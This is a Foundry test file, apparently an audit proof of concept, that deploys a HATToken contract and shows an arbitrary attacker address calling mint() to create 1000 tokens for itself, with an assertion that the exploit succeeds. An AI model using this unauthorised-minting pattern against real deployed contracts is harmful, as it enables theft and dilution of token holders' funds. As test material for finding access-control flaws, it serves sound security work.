// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

//@dev - Foundry
import { Test } from "forge-std/Test.sol";

import "forge-std/console.sol";

//@dev - Target contract
import { HATToken } from "../../../contracts/HATToken.sol";


/**
 * @notice - The test of exploit of the HATToken.sol in Foundry
 */
contract HATTokenExploitTest is Test {

    //@dev - Smart contract instances
    HATToken public hatToken;

    address GOVERNANCE = makeAddr("governance");
    address MINTER = makeAddr("minter");

    address ATTACKER = makeAddr("attacker");


    /**
     * @dev - Constructor
     */ 
    function setUp() public {
        //@dev - Deploy the HATToken.sol
        hatToken = new HATToken(GOVERNANCE);
        console.log("Deployed-address of the HATToken.sol:", address(hatToken));

        //@dev - Set a minter address by governance's address
        vm.startPrank(GOVERNANCE);
        hatToken.setMinter(MINTER, 10000000e18);  //[NOTE]: setMinter method is controlled by "onlyOwner"
        vm.stopPrank();

        //@dev - Mint $HAT Tokens initially
        vm.startPrank(MINTER);
        hatToken.mint(MINTER, 10000000e18);
        vm.stopPrank();

        //@dev - 
    }

    /**
     * @dev - Check initial states
     */ 
    function testCheck_initialStates() public {
        //@dev - Owner of the HATToken.sol (wallet address of 'governance')
        address owner = hatToken.owner();
        console.log("Owner of the HATToken.sol (wallet address of 'governance'):", owner);
        assertEq(GOVERNANCE, owner);

        console.log("totalSupply of HATToken: ", hatToken.totalSupply());

        //@dev - EOA wallet address of attacker
        console.log("EOA wallet address of attacker:", ATTACKER);
    }

    /**
     * @dev - Execute a test to show exploit using mint() method in the HATToken.sol
     */ 
    function testExploit_mint() public {
        vm.startPrank(ATTACKER);

        address _account = ATTACKER;
        //uint _amount = type(uint256).max;
        //uint _amount = hatToken.totalSupply();
        uint _amount = 1000e18;  // 1000 $HAT Tokens
        hatToken.mint(_account, _amount);

        vm.stopPrank();

        //@dev - Check the result of this exploit: An attacker address should has "_amount" of $HATToken
        assertEq(hatToken.balanceOf(ATTACKER), _amount);

        console.log("Successful to run testExploit_mint()");
    }

}